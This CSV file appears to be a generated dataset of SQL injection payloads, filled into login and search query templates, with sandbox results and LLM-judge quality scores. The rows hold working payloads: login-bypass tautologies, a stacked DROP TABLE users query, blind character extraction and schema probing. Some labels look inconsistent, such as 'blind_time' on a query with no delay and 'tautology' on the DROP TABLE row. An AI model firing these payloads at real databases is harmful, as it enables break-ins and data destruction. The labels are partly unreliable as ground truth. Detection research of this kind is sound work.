query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00000,'; DROP TABLE users; --,SELECT * FROM users WHERE username = ''; DROP TABLE users; --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Column"", ""Semicolon"", ""Identifier"", ""Drop"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00001,1' OR (SELECT COUNT(*) FROM information_schema.TABLES) > 0 --,SELECT * FROM users WHERE username = '1' OR (SELECT COUNT(*) FROM information_schema.TABLES) > 0 --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""GT"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Count""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00002,-- OR 1=1/**/,SELECT * FROM users WHERE username = '-- OR 1=1/**/' AND password = 'anything',tautology,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00005,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00007,"' OR ASCII(SUBSTRING(username, 1, 1)) = 65 --","SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(username, 1, 1)) = 65 --' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00008,' OR EXISTS(SELECT * FROM users WHERE 1=1) --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM users WHERE 1=1) --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00009,' OR (SELECT 1 FROM users WHERE username LIKE '%a%') = 1 --,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM users WHERE username LIKE '%a%') = 1 --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00010,1%' OR '1'='1,SELECT * FROM products WHERE name LIKE '%1%' OR '1'='1%',tautology,search,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00012,1' AND EXISTS(SELECT 1 FROM users WHERE username='admin')--,SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT 1 FROM users WHERE username='admin')--%',tautology,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00013,1' --,SELECT * FROM products WHERE name LIKE '%1' --%',tautology,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
